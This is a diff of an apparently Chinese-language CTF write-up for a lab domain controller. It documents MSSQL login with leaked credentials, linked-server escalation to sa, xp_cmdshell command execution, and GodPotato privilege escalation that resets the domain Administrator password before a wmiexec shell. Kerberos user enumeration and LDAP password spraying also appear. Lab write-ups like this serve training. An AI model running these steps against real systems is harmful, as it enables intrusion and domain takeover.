 ```latex
 C:\inetpub\wwwroot\poo_connection.txt
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">内容是明文 SQL 连接串：</font>
+内容是明文 SQL 连接串：
 
 ```latex
 server=localhost;
@@ -3614,24 +3615,24 @@ password=lovlyBaby
 database=master
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这一条直接把 MSSQL 入口送出来了。</font>
+这一条直接把 MSSQL 入口送出来了。
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第一步：连接 MSSQL</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">用连接串登录 SQL Server：</font>
+## 第一步：连接 MSSQL
+用连接串登录 SQL Server：
 
 ```latex
 wuwupor / lovlyBaby
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">登录成功，但当前账号不是 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sysadmin</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">：</font>
+登录成功，但当前账号不是 `sysadmin`：
 
 ```sql
 select is_srvrolemember('sysadmin')
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">返回 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">0</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>
+返回 `0`。
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">继续枚举时，发现 SQL Server 上配置了两个非常可疑的 linked server：</font>
+继续枚举时，发现 SQL Server 上配置了两个非常可疑的 linked server：
 
 ```sql
 select name, product, provider, data_source,
@@ -3639,19 +3640,19 @@ select name, product, provider, data_source,
 from sys.servers
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">结果里有：</font>
+结果里有：
 
-+ `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">POO_PUBLIC</font>`
-+ `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">POO_CONFIG</font>`
++ `POO_PUBLIC`
++ `POO_CONFIG`
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第二步：利用 linked server 提权到 SQL sysadmin</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">进一步验证这两个 linked server 的远端身份：</font>
+## 第二步：利用 linked server 提权到 SQL sysadmin
+进一步验证这两个 linked server 的远端身份：
 
 ```sql
 select * from openquery(POO_PUBLIC, 'select @@servername as srv, db_name() as db, system_user as su, user_name() as un')
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">返回：</font>
+返回：
 
 ```latex
 srv = CASTLEVANIA
@@ -3660,51 +3661,51 @@ su  = sa
 un  = dbo
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">也就是说：</font>
+也就是说：
 
 ```latex
 wuwupor -> POO_PUBLIC -> localhost 上的 sa/dbo
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这就相当于把本来不具备 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sysadmin</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 的账号，借 linked server 直接借成了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sa</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>
+这就相当于把本来不具备 `sysadmin` 的账号，借 linked server 直接借成了 `sa`。
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">而且 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">xp_cmdshell</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 已经是开启状态：</font>
+而且 `xp_cmdshell` 已经是开启状态：
 
 ```sql
 exec ('exec master..sp_configure ''xp_cmdshell''') at POO_PUBLIC
 ```
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第三步：拿到系统命令执行</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">通过 linked server 执行命令：</font>
+## 第三步：拿到系统命令执行
+通过 linked server 执行命令：
 
 ```sql
 exec ('exec master..xp_cmdshell ''whoami''') at POO_PUBLIC
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">回显是：</font>
+回显是：
 
 ```latex
 xmcve\sqlsvc
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">也就是说当前操作系统命令执行身份是 SQL Server 服务账号 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">xmcve\sqlsvc</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>
+也就是说当前操作系统命令执行身份是 SQL Server 服务账号 `xmcve\sqlsvc`。
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">继续查它的特权：</font>
+继续查它的特权：
 
 ```latex
 whoami /priv
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">可以看到：</font>
+可以看到：
 
 ```latex
 SeImpersonatePrivilege        Enabled
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">所以标准的 Potato 链是可用的。</font>
+所以标准的 Potato 链是可用的。
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第四步：为什么 PrintSpoofer 不行</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">我最开始先试了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">PrintSpoofer</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">，但很快发现这台机器的 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Spooler</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 是关着的，而且启动类型是 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Disabled</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">：</font>
+## 第四步：为什么 PrintSpoofer 不行
+我最开始先试了 `PrintSpoofer`，但很快发现这台机器的 `Spooler` 是关着的，而且启动类型是 `Disabled`：
 
 ```latex
 Get-Service Spooler
@@ -3712,18 +3713,18 @@ Status    : Stopped
 StartType : Disabled
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">因此 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">PrintSpoofer</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 这条链虽然二进制能执行，但不会真正完成提权。</font>
+因此 `PrintSpoofer` 这条链虽然二进制能执行，但不会真正完成提权。
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第五步：改用 GodPotato</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">由于系统是 Windows Server 2019，且 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sqlsvc</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 拥有 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">SeImpersonatePrivilege</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">，直接换成 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 即可。</font>
+## 第五步：改用 GodPotato
+由于系统是 Windows Server 2019，且 `sqlsvc` 拥有 `SeImpersonatePrivilege`，直接换成 `GodPotato` 即可。
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">我在宿主机开了一个临时 HTTP 服务，把 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato-NET4.exe</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 投到客机，然后通过 SQL 执行：</font>
+我在宿主机开了一个临时 HTTP 服务，把 `GodPotato-NET4.exe` 投到客机，然后通过 SQL 执行：
 
 ```latex
 C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c net user Administrator Xmctf2026Aa /domain"
 ```
 
-`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 的关键回显如下：</font>
+`GodPotato` 的关键回显如下：
 
 ```latex
 [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
@@ -3735,91 +3736,91 @@ C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c net user Administrator Xmctf2026
 The command completed successfully.
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这说明链条已经把 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sqlsvc</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 抬到了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">SYSTEM</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">，并成功执行了我们给它的命令。</font>
+这说明链条已经把 `sqlsvc` 抬到了 `SYSTEM`，并成功执行了我们给它的命令。
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">随后再查：</font>
+随后再查：
 
 ```latex
 net user Administrator /domain
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">可以看到 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Password last set</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 已经更新，说明域管理员密码确实被改掉了。</font>
+可以看到 `Password last set` 已经更新，说明域管理员密码确实被改掉了。
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">第六步：验证 Administrator shell</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">最后直接用新密码通过 impacket 的 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">wmiexec.py</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 验证远程管理员执行：</font>
+## 第六步：验证 Administrator shell
+最后直接用新密码通过 impacket 的 `wmiexec.py` 验证远程管理员执行：
 
 ```bash
 python wmiexec.py XMCVE/Administrator:Xmctf2026Aa@169.254.212.20 whoami
 python wmiexec.py XMCVE/Administrator:Xmctf2026Aa@169.254.212.20 hostname
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">回显：</font>
+回显：
 
 ```latex
 xmcve\administrator
 CASTLEVANIA
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这一步已经满足题目要求的：</font>
+这一步已经满足题目要求的：
 
 ```latex
 拿到 Administrator shell
 ```
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">补充：本地 flag 文本的恢复</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">虽然官方 flag 要人工审核后发放，但镜像里其实残留了一个已经删除的本地 flag 文件线索。</font>
+## 补充：本地 flag 文本的恢复
+虽然官方 flag 要人工审核后发放，但镜像里其实残留了一个已经删除的本地 flag 文件线索。
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">在 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Alucard</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 的 Recent 里有一个快捷方式：</font>
+在 `Alucard` 的 Recent 里有一个快捷方式：
 
 ```latex
 C:\Users\Alucard\Recent\flag.lnk
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">它指向：</font>
+它指向：
 
 ```latex
 C:\Users\Administrator\Desktop\flag.txt
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这个文件本身已经被删掉了，但在回收站目录中仍然留有内容文件：</font>
+这个文件本身已经被删掉了，但在回收站目录中仍然留有内容文件：
 
 ```latex
 $Recycle.Bin\S-1-5-21-...-500\$RIZ9PVX.txt
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">离线读这个文件，能恢复出：</font>
+离线读这个文件，能恢复出：
 
 ```latex
 FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">再次强调，这更像是镜像内的本地证明文本，不一定等于比赛平台最后发放的正式 flag。</font>
+再次强调，这更像是镜像内的本地证明文本，不一定等于比赛平台最后发放的正式 flag。
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Exploit</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">完整利用脚本放在：</font>
+## Exploit
+完整利用脚本放在：
 
 ```latex
 exploit/solve.py
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">脚本做的事情是：</font>
+脚本做的事情是：
 
-1. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">在宿主机开启临时 HTTP 服务。</font>
-2. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">用 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">wuwupor / lovlyBaby</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 登录 MSSQL。</font>
-3. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">通过 linked server </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">POO_PUBLIC</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 执行 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">xp_cmdshell</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>
-4. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">向客机投递并运行 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato-NET4.exe</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>
-5. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">把 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Administrator</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 的域密码改成已知值。</font>
-6. <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">调用 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">wmiexec.py</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 验证 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Administrator</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> shell。</font>
+1. 在宿主机开启临时 HTTP 服务。
+2. 用 `wuwupor / lovlyBaby` 登录 MSSQL。
+3. 通过 linked server `POO_PUBLIC` 执行 `xp_cmdshell`。
+4. 向客机投递并运行 `GodPotato-NET4.exe`。
+5. 把 `Administrator` 的域密码改成已知值。
+6. 调用 `wmiexec.py` 验证 `Administrator` shell。
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">运行方式</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">在当前主机上直接执行：</font>
+## 运行方式
+在当前主机上直接执行：
 
 ```bash
 python C:\AI知识库\Test\polarisctf2026\tasks\Web\16-BabyDC\exploit\solve.py
 ```
 
-## <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">小结</font>
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">这题的核心链非常清晰：</font>
+## 小结
+这题的核心链非常清晰：
 
 ```latex
 离线盘分析 -> webroot 明文连接串 -> MSSQL 登录 ->
@@ -3828,45 +3829,45 @@ GodPotato(SeImpersonate) -> SYSTEM ->
 重置 Administrator 密码 -> Administrator shell
 ```
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">其中最关键的两个点是：</font>
+其中最关键的两个点是：
 
-1. `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">poo_connection.txt</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 泄露了 SQL 凭据。</font>
-2. `<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">POO_PUBLIC</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 这个 linked server 把普通 SQL 登录桥接成了 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">sa</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">。</font>
+1. `poo_connection.txt` 泄露了 SQL 凭据。
+2. `POO_PUBLIC` 这个 linked server 把普通 SQL 登录桥接成了 `sa`。
 
-<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">有了这两步，后面的 </font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GodPotato</font>`<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);"> 只是把 “系统命令执行” 再抬成 “管理员控制整台 DC”。</font>
+有了这两步，后面的 `GodPotato` 只是把 “系统命令执行” 再抬成 “管理员控制整台 DC”。
 
-# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">GDEX(土豆提权)</font>
-## <font style="color:rgb(51, 51, 51);">1. 题目环境与边界</font>
-<font style="color:rgb(51, 51, 51);">工具：VirtualBox 7.2.0、PowerShell、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ipconfig</font>`
+# GDEX(土豆提权)
+## 1. 题目环境与边界
+工具：VirtualBox 7.2.0、PowerShell、`ipconfig`
 
-<font style="color:rgb(51, 51, 51);">目的：确认靶机网络、攻击边界和目标身份，确保后续动作只落在靶机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.101</font>`<font style="color:rgb(51, 51, 51);"> 上，不对宿主机做攻击。</font>
+目的：确认靶机网络、攻击边界和目标身份，确保后续动作只落在靶机 `192.168.56.101` 上，不对宿主机做攻击。
 
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+关键命令：
 
 ipconfig
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
-+ <font style="color:rgb(51, 51, 51);">宿主机 VirtualBox Host-Only 网卡为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.1/24</font>`<font style="color:rgb(51, 51, 51);">。</font>
-+ <font style="color:rgb(51, 51, 51);">靶机最终恢复到 Host-Only 网络，目标地址确定为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.101</font>`<font style="color:rgb(51, 51, 51);">。</font>
-+ <font style="color:rgb(51, 51, 51);">靶机身份后续通过 LDAP/SQL 进一步确认：</font>
-    - <font style="color:rgb(51, 51, 51);">主机名：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA</font>`
-    - <font style="color:rgb(51, 51, 51);">域名：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE.local</font>`
-    - <font style="color:rgb(51, 51, 51);">系统：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Windows Server 2019</font>`
-    - <font style="color:rgb(51, 51, 51);">角色：域控</font>
++ 宿主机 VirtualBox Host-Only 网卡为 `192.168.56.1/24`。
++ 靶机最终恢复到 Host-Only 网络，目标地址确定为 `192.168.56.101`。
++ 靶机身份后续通过 LDAP/SQL 进一步确认：
+    - 主机名：`CASTLEVANIA`
+    - 域名：`XMCVE.local`
+    - 系统：`Windows Server 2019`
+    - 角色：域控
 
-<font style="color:rgb(51, 51, 51);">说明：</font>
+说明：
 
-+ <font style="color:rgb(51, 51, 51);">整个过程只打 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.101</font>`<font style="color:rgb(51, 51, 51);">。</font>
-+ <font style="color:rgb(51, 51, 51);">宿主机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.1</font>`<font style="color:rgb(51, 51, 51);"> 仅在后期作为 HTTP 文件服务端，给靶机下发工具文件，不作为攻击目标。</font>
++ 整个过程只打 `192.168.56.101`。
++ 宿主机 `192.168.56.1` 仅在后期作为 HTTP 文件服务端，给靶机下发工具文件，不作为攻击目标。
 
-## <font style="color:rgb(51, 51, 51);">2. 初始信息搜集</font>
-### <font style="color:rgb(51, 51, 51);">2.1 Web 探测</font>
-<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">web_probe.py</font>`
+## 2. 初始信息搜集
+### 2.1 Web 探测
+工具：`web_probe.py`
 
-<font style="color:rgb(51, 51, 51);">目的：确认 Web 面是否存在可直接利用的入口、虚拟主机、隐藏路径或调试页面。</font>
+目的：确认 Web 面是否存在可直接利用的入口、虚拟主机、隐藏路径或调试页面。
 
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+关键命令：
 
 ```plain
 import argparse
@@ -3941,33 +3942,33 @@ if __name__ == "__main__":
 
 python .\web_probe.py --url http://192.168.56.101
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80/tcp</font>`<font style="color:rgb(51, 51, 51);"> 为 IIS 10.0。</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/</font>`<font style="color:rgb(51, 51, 51);"> 与 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/index.html</font>`<font style="color:rgb(51, 51, 51);"> 返回静态页面，内容为：</font>
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA Portal</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Employee Portal</font>`
-    - `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Under maintenance...</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">OPTIONS</font>`<font style="color:rgb(51, 51, 51);"> 允许的方法为：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">OPTIONS, TRACE, GET, HEAD, POST</font>`
++ `80/tcp` 为 IIS 10.0。
++ `/` 与 `/index.html` 返回静态页面，内容为：
+    - `CASTLEVANIA Portal`
+    - `Employee Portal`
+    - `Under maintenance...`
++ `OPTIONS` 允许的方法为：`OPTIONS, TRACE, GET, HEAD, POST`
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">Web 面非常薄，没有直接给出认证入口或现成 RCE。</font>
-+ <font style="color:rgb(51, 51, 51);">站点更像“占位页面 + 后端另有依赖”，应继续往 IIS 配置、连接串和数据库方向挖。</font>
++ Web 面非常薄，没有直接给出认证入口或现成 RCE。
++ 站点更像“占位页面 + 后端另有依赖”，应继续往 IIS 配置、连接串和数据库方向挖。
 
-### <font style="color:rgb(51, 51, 51);">2.2 LDAP RootDSE 匿名枚举</font>
-<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ldap_rootdse.py</font>`
+### 2.2 LDAP RootDSE 匿名枚举
+工具：`ldap_rootdse.py`
 
-<font style="color:rgb(51, 51, 51);">目的：确认域信息、LDAP 命名上下文、DC 身份。</font>
+目的：确认域信息、LDAP 命名上下文、DC 身份。
 
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+关键命令：
 
 ```plain
 $env:PYTHONPATH='f:\aaa\新建文件夹\aaaaaaaaaasentou\.deps'
 python .\ldap_rootdse.py
 ```
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
 ```plain
 [+] default_naming_context: ['DC=XMCVE,DC=local']
@@ -3975,24 +3976,24 @@ python .\ldap_rootdse.py
 [+] ldap_service_name: ['XMCVE.local:castlevania$@XMCVE.LOCAL']
 ```
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">目标是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE.local</font>`<font style="color:rgb(51, 51, 51);"> 域内 DC。</font>
-+ <font style="color:rgb(51, 51, 51);">后续所有 LDAP/Kerberos/MSSQL 利用都可以围绕这个域来展开。</font>
++ 目标是 `XMCVE.local` 域内 DC。
++ 后续所有 LDAP/Kerberos/MSSQL 利用都可以围绕这个域来展开。
 
-### <font style="color:rgb(51, 51, 51);">2.3 Kerberos 用户枚举</font>
-<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">kerb_user_enum.py</font>`
+### 2.3 Kerberos 用户枚举
+工具：`kerb_user_enum.py`
 
-<font style="color:rgb(51, 51, 51);">目的：枚举有效域用户，确认后续喷洒、凭据猜解和服务账号方向。</font>
+目的：枚举有效域用户，确认后续喷洒、凭据猜解和服务账号方向。
 
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+关键命令：
 
 ```plain
 $env:PYTHONPATH='f:\aaa\新建文件夹\aaaaaaaaaasentou\.deps'
 python .\kerb_user_enum.py --no-asrep
 ```
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
 ```plain
 VALID   Administrator   25
@@ -4003,78 +4004,78 @@ INVALID Guest           18
 INVALID krbtgt          18
 ```
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">有效用户至少包括：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Alucard</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">support</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);">。</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 极像 MSSQL 服务账号，优先级最高。</font>
++ 有效用户至少包括：`Administrator`、`Alucard`、`support`、`sqlsvc`。
++ `sqlsvc` 极像 MSSQL 服务账号，优先级最高。
 
-### <font style="color:rgb(51, 51, 51);">2.4 低噪声 LDAP 密码喷洒</font>
-<font style="color:rgb(51, 51, 51);">工具：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">password_spray_ldap.py</font>`
+### 2.4 低噪声 LDAP 密码喷洒
+工具：`password_spray_ldap.py`
 
-<font style="color:rgb(51, 51, 51);">目的：对已经确定的少量有效用户做极小范围喷洒，看看是否存在弱口令复用。</font>
+目的：对已经确定的少量有效用户做极小范围喷洒，看看是否存在弱口令复用。
 
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+关键命令：
 
 ```plain
 $env:PYTHONPATH='f:\aaa\新建文件夹\aaaaaaaaaasentou\.deps'
 python .\password_spray_ldap.py
 ```
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
-+ <font style="color:rgb(51, 51, 51);">对 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Alucard / sqlsvc / support / Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的小范围喷洒没有命中。</font>
++ 对 `Alucard / sqlsvc / support / Administrator` 的小范围喷洒没有命中。
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">该题不走“简单弱口令”路线。</font>
-+ <font style="color:rgb(51, 51, 51);">后续更应该关注配置泄露、服务账号、数据库与离线取证。</font>
++ 该题不走“简单弱口令”路线。
++ 后续更应该关注配置泄露、服务账号、数据库与离线取证。
 
-### <font style="color:rgb(51, 51, 51);">2.5 初始开放端口结论</font>
-<font style="color:rgb(51, 51, 51);">工具：端口探测</font>
